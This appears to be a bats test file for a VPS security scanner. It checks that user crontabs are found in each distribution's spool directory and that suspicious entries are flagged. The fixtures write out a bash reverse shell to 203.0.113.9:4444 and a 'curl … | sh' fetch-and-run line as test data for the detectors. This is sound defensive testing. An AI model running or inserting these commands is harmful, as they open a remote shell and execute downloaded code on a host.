#!/usr/bin/env bats
# Per-user crontabs are read from cron_spool_dir, so a cronie host (RHEL,
# Arch: /var/spool/cron/<user>) is scanned and counted like a Debian one.

load helpers.bash

setup() {
    _vpssec_load core/distro.sh
    i18n_load en_US
    # shellcheck source=/dev/null
    source "$(_vpssec_repo_root)/modules/filesystem.sh"
    # shellcheck source=/dev/null
    source "$(_vpssec_repo_root)/modules/scheduling.sh"

    SPOOL_DIR="$BATS_TEST_TMPDIR/spool/cron"
    mkdir -p "$SPOOL_DIR"
    cron_spool_dir() { printf '%s\n' "$SPOOL_DIR"; }
}

@test "cron spool: each family names its own spool directory" {
    unset -f cron_spool_dir
    # shellcheck source=/dev/null
    source "$(_vpssec_repo_root)/core/distro.sh"
    VPSSEC_DISTRO_FAMILY=debian run cron_spool_dir
    [ "$output" = "/var/spool/cron/crontabs" ]
    VPSSEC_DISTRO_FAMILY=rhel run cron_spool_dir
    [ "$output" = "/var/spool/cron" ]
    VPSSEC_DISTRO_FAMILY=arch run cron_spool_dir
    [ "$output" = "/var/spool/cron" ]
}

@test "cron spool: user crontabs are counted from the spool directory" {
    printf '* * * * * true\n' > "$SPOOL_DIR/root"
    printf '* * * * * true\n' > "$SPOOL_DIR/deploy"
    run _fs_count_user_crontabs
    [ "$output" = "2" ]
}

@test "cron spool: a suspicious user crontab entry is reported with its owner" {
    printf '* * * * * bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n' > "$SPOOL_DIR/deploy"
    run _fs_find_suspicious_cron
    [[ "$output" == *"User deploy crontab: matches"* ]]
}

@test "cron spool: the scheduling inventory reads the same spool directory" {
    printf '# header\n*/5 * * * * curl -s http://203.0.113.9/x | sh\n' > "$SPOOL_DIR/deploy"
    run _sched_find_internet_fetch_in_cron
    [[ "$output" == *"$SPOOL_DIR/deploy:2"* ]]
    # A location, never the entry: cron lines carry tokens.
    [[ "$output" != *"203.0.113.9"* ]]
}

@test "cron spool: a commented-out fetch is not reported" {
    printf '# */5 * * * * curl -s http://203.0.113.9/x | sh\n' > "$SPOOL_DIR/deploy"
    run _sched_find_internet_fetch_in_cron
    [[ "$output" != *"$SPOOL_DIR/deploy"* ]]
}

@test "cron spool: a file name that is not valid sed still has its entries read" {
    # Same loop as /etc/cron.d, where cronie runs a file named a|b. A name spliced
    # into a sed program made sed fail and the file's entries, and the finding, vanish.
    printf '*/5 * * * * curl -s http://203.0.113.9/x | sh\n' > "$SPOOL_DIR/a|b&c\\d"
    run _sched_find_internet_fetch_in_cron
    [ "$output" = "$SPOOL_DIR/a|b&c\\d:1" ]
}

@test "cron spool: a fetch is matched in the entry, not in the file name" {
    printf '* * * * * echo hi | sh\n' > "$SPOOL_DIR/curl-checker"
    run _sched_find_internet_fetch_in_cron
    [ -z "$output" ]
}
